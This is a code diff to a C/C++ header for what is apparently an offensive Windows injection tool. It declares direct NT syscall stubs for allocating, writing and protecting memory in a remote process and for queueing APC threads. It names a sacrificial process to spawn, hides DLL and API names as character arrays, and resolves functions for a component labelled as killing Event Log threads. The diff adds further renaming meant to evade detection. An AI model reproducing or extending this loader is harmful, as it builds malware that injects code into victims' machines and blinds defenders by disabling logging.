@@ -4,9 +4,10 @@
 
 // Sacrificial Process to spawn
 #define SPAWN "c:\\windows\\system32\\SecurityHealthSystray.exe"
+//#define SPAWN "c:\\windows\\system32\\notepad.exe"
 
-#pragma comment (lib, "ntdll.lib")		// For the Usage of Nt Functions
-#pragma comment (lib,"Advapi32.lib")	//	For ServiceManager shit!
+//#pragma comment (lib, "ntdll.lib")		// For the Usage of Nt Functions
+//#pragma comment (lib,"Advapi32.lib")	//	For ServiceManager shit!
 
 #define NT_SUCCESS(Status)	(((NTSTATUS)(Status)) >= 0)		// Macro defined in ntapi.h
 
@@ -23,7 +24,7 @@ BOOL flag = TRUE;
 
 typedef NTSTATUS* PNTSTATUS;  // Define a pointer to NTSTATUS
 
-EXTERN_C NTSTATUS NtAllocateVirtualMemory(
+EXTERN_C NTSTATUS sysNtAllocateVirtualMemory(
 	HANDLE    ProcessHandle,
 	PVOID* BaseAddress,
 	ULONG_PTR ZeroBits,
@@ -32,7 +33,7 @@ EXTERN_C NTSTATUS NtAllocateVirtualMemory(
 	ULONG     Protect
 );
 
-EXTERN_C NTSTATUS NtProtectVirtualMemory(
+EXTERN_C NTSTATUS sysNtProtectVirtualMemory(
 	IN HANDLE ProcessHandle,
 	IN OUT PVOID* BaseAddress,
 	IN OUT PSIZE_T RegionSize,
@@ -40,22 +41,21 @@ EXTERN_C NTSTATUS NtProtectVirtualMemory(
 	OUT PULONG OldProtect
 );
 
-EXTERN_C NTSTATUS NtWriteVirtualMemory(
+
+EXTERN_C NTSTATUS sysNtWriteVirtualMemory(
 	IN HANDLE               ProcessHandle,
 	IN PVOID                BaseAddress,
 	IN PVOID                Buffer,
 	IN SIZE_T                NumberOfBytesToWrite,
-	OUT PULONG              NumberOfBytesWritten OPTIONAL
+	OUT PULONG              NumberOfBytesWritten
 );
 
-/*
-EXTERN_C NTSTATUS NtOpenProcess(
+EXTERN_C NTSTATUS sysNtOpenProcess(
 	PHANDLE ProcessHandle,
 	ACCESS_MASK DesiredAccess,
 	POBJECT_ATTRIBUTES ObjectAttributes,
 	PCLIENT_ID ClientId
 );
-*/
 
 /*
 EXTERN_C NTSTATUS NtCreateThreadEx(
@@ -71,8 +71,9 @@ EXTERN_C NTSTATUS NtCreateThreadEx(
 	IN SIZE_T SizeOfStackReserve,
 	OUT PVOID lpBytesBuffer
 );
+*/
 
-
+/*
 EXTERN_C NTSTATUS NtWaitForSingleObject(
 	IN HANDLE         Handle,
 	IN BOOLEAN        Alertable,
@@ -96,7 +97,7 @@ typedef VOID(NTAPI* PIO_APC_ROUTINE)(
 	IN ULONG            Reserved
 	);
 
-EXTERN_C NTSTATUS NtQueueApcThread(
+EXTERN_C NTSTATUS sysNtQueueApcThread(
 
 	HANDLE ThreadHandle,
 	PIO_APC_ROUTINE ApcRoutine,
@@ -105,17 +106,64 @@ EXTERN_C NTSTATUS NtQueueApcThread(
 	ULONG ApcReserved OPTIONAL
 );
 
-
+/*
 // Code: https://evasions.checkpoint.com/techniques/timing.html
-EXTERN_C NTSTATUS NtDelayExecution(
+EXTERN_C NTSTATUS sysNtDelayExecution(
 	IN BOOLEAN              Alertable,
 	IN PLARGE_INTEGER       DelayInterval
 );
+*/
+
+// Nt Function declarations:
+
+NTSTATUS(*NtAllocateVirtualMemory)(
+	HANDLE    ProcessHandle,
+	PVOID* BaseAddress,
+	ULONG_PTR ZeroBits,
+	PSIZE_T   RegionSize,
+	ULONG     AllocationType,
+	ULONG     Protect
+	);
+
+NTSTATUS(*NtWriteVirtualMemory)(
+	HANDLE hProcess,
+	PVOID lpBaseAddress,
+	PVOID lpBuffer,
+	SIZE_T NumberOfBytesToRead,
+	PULONG NumberOfBytesRead
+	);
+
+NTSTATUS(*NtProtectVirtualMemory)(
+	IN HANDLE ProcessHandle,
+	IN PVOID* BaseAddress,
+	IN PSIZE_T NumberOfBytesToProtect,
+	IN ULONG NewAccessProtection,
+	OUT PULONG OldAccessProtection
+	);
+
+NTSTATUS(*NtOpenProcess)(
+	PHANDLE ProcessHandle,
+	ACCESS_MASK DesiredAccess,
+	POBJECT_ATTRIBUTES ObjectAttributes,
+	PCLIENT_ID ClientId
+	);
+
+NTSTATUS(*NtQueueApcThread)(
+	HANDLE ThreadHandle,
+	PIO_APC_ROUTINE ApcRoutine,
+	PVOID ApcRoutineContext OPTIONAL,
+	PIO_STATUS_BLOCK ApcStatusBlock OPTIONAL,
+	ULONG ApcReserved OPTIONAL
+	);
+
 
 // Ntapi obfuscation:
 
-const char kernel32[] = { 'k','e','r','n','e','l','3','2','.','d','l','l', 0 };
-const char ntdll[] = { 'n','t','d','l','l','.','d','l','l', 0 };
+// kernel32:
+const char win32[] = { 'k','e','r','n','e','l','3','2','.','d','l','l', 0 };
+
+// ntdll:
+const char interfacedll[] = { 'n','t','d','l','l','.','d','l','l', 0 };
 //const char NtAlloc[] = { 'N','t','A','l','l','o','c','a','t','e','V','i','r','t','u','a','l','M','e','m','o','r','y', 0 };
 //const char NtProtect[] = { 'N','t','P','r','o','t','e','c','t','V','i','r','t','u','a','l','M','e','m','o','r','y', 0 };
 //const char NtWrite[] = { 'N','t','W','r','i','t','e','V','i','r','t','u','a','l','M','e','m','o','r','y', 0 };
@@ -124,13 +172,20 @@ const char ntdll[] = { 'n','t','d','l','l','.','d','l','l', 0 };
 
 //const char sNtOpenProcess[] = { 'N','t','O','p','e','n','P','r','o','c','e','s','s', 0 };
 
-const char sOpenProcess[] = { 'O','p','e','n','P','r','o','c','e','s','s', 0 };
-const char sCreateProcessA[] = { 'C','r','e','a','t','e','P','r','o','c','e','s','s','A', 0 };
-const char sSuspendThread[] = { 'S','u','s','p','e','n','d','T','h','r','e','a','d', 0 };
-const char sNtQueueApcThread[] = { 'N','t','Q','u','e','u','e','A','p','c','T','h','r','e','a','d', 0 };
+// sOpenProcess:
+const char sOpenP[] = { 'O','p','e','n','P','r','o','c','e','s','s', 0 };
+
+// sCreateProcessA:
+const char sCrP[] = { 'C','r','e','a','t','e','P','r','o','c','e','s','s','A', 0 };
+
+// sSuspendThread:
+const char sSus[] = { 'S','u','s','p','e','n','d','T','h','r','e','a','d', 0 };
+//const char sNtQueueApcThread[] = { 'N','t','Q','u','e','u','e','A','p','c','T','h','r','e','a','d', 0 };
 
 // For EventLog Thread Kill
-const char sadvapi32_dll[] = { 'a','d','v','a','p','i','3','2','.','d','l','l', 0 };
+
+// sadvapi32_dll:
+const char sadv[] = { 'a','d','v','a','p','i','3','2','.','d','l','l', 0 };
 const char sI_QueryTagInformation[] = { 'I','_','Q','u','e','r','y','T','a','g','I','n','f','o','r','m','a','t','i','o','n', 0 };
 const char sNtQueryInformationThread[] = { 'N','t','Q','u','e','r','y','I','n','f','o','r','m','a','t','i','o','n','T','h','r','e','a','d', 0 };
 //const char sOpenSCManagerA[] = { 'O','p','e','n','S','C','M','a','n','a','g','e','r','A', 0 };
@@ -153,10 +208,10 @@ const char sNtQueryInformationThread[] = { 'N','t','Q','u','e','r','y','I','n','
 // ============================= End: For indirect.cpp + KillEventLog.h ===============================================================
 
 using I_QueryTagInformationPrototype = ULONG(WINAPI*)(PVOID, SC_SERVICE_TAG_QUERY_TYPE, PSC_SERVICE_TAG_QUERY);
-I_QueryTagInformationPrototype I_QueryTagInformation = (I_QueryTagInformationPrototype)GetProcAddress(GetModuleHandleA(sadvapi32_dll), sI_QueryTagInformation);
+I_QueryTagInformationPrototype I_QueryTagInformation = (I_QueryTagInformationPrototype)GetProcAddress(GetModuleHandleA(sadv), sI_QueryTagInformation);
 
 typedef NTSTATUS(WINAPI* NtQueryInformationThread_t)(HANDLE, THREAD_INFORMATION_CLASS, PVOID, ULONG, PULONG);
-NtQueryInformationThread_t NtQueryInformationThread = (NtQueryInformationThread_t)GetProcAddress(GetModuleHandleA(ntdll), sNtQueryInformationThread);
+NtQueryInformationThread_t NtQueryInformationThread = (NtQueryInformationThread_t)GetProcAddress(GetModuleHandleA(interfacedll), sNtQueryInformationThread);
 
 //using OpenSCManagerAPrototype = SC_HANDLE(WINAPI*)(LPCSTR, LPCSTR, DWORD);
 //OpenSCManagerAPrototype OpenSCManagerA = (OpenSCManagerAPrototype)GetProcAddress(GetModuleHandleA(sadvapi32_dll), sOpenSCManagerA);
